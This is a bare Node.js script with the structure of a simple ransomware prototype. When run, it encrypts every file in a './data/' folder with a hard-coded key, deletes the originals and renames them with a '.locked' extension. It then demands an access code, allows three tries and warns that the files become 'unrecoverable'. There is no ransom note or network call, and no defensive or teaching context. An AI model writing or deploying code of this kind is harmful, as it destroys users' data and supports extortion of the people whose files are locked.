const secureHandler = require("file-encryptor");
const fileSystem = require("fs");
const readLine = require("readline");

const dirPath = "./data/";
const secretCode = "ConfidentialKey";
let accessCode = "";
let accessAttempts = 0;
const MAX_ATTEMPTS = 3;

async function lockFile(filePath, outputPath) {
  return new Promise((resolve) => {
    secureHandler.encryptFile(filePath, outputPath, secretCode, (err) => {
      if (err) {
        console.error("Encryption error:", err);
      } else {
        fileSystem.unlinkSync(filePath);
        console.log(`File encryption completed for ${filePath}.`);
      }
      resolve();
    });
  });
}

async function unlockFile(filePath, outputPath) {
  return new Promise((resolve) => {
    secureHandler.decryptFile(filePath, outputPath, accessCode, (err) => {
      if (err) {
        console.error("Decryption error:", err);
      } else {
        fileSystem.unlinkSync(filePath);
        console.log(`File decryption completed for ${filePath}.`);
      }
      resolve();
    });
  });
}

async function processFiles(action) {
  const files = fileSystem.readdirSync(dirPath);
  for (const fileName of files) {
    const filePath = `${dirPath}${fileName}`;
    const fileExtension = action === "lock" ? ".locked" : "";
    const outputPath = `${dirPath}${fileName}${fileExtension}`;

    if (action === "lock") {
      await lockFile(filePath, outputPath);
    } else if (action === "unlock") {
      await unlockFile(filePath, outputPath.replace(".locked", ""));
    }
  }
}

function getUserCode(action) {
  const rl = readLine.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  rl.question(`Enter access code for ${action}ion: `, (codeAnswer) => {
    rl.close();
    if (codeAnswer === secretCode) {
      console.log(`${action}ing files...`);
      accessCode = codeAnswer;
      processFiles(action);
    } else {
      accessAttempts++;
      if (accessAttempts < MAX_ATTEMPTS) {
        console.log(
          `Incorrect access code. ${
            MAX_ATTEMPTS - accessAttempts
          } attempts remaining. Please try again.`
        );
        getUserCode(action);
      } else {
        console.log("Exceeded maximum access attempts. Your files are unrecoverable.");
        process.exit(1);
      }
    }
  });
}

console.log("Locking files...");
processFiles("lock").then(() => {
  getUserCode("unlock");
});
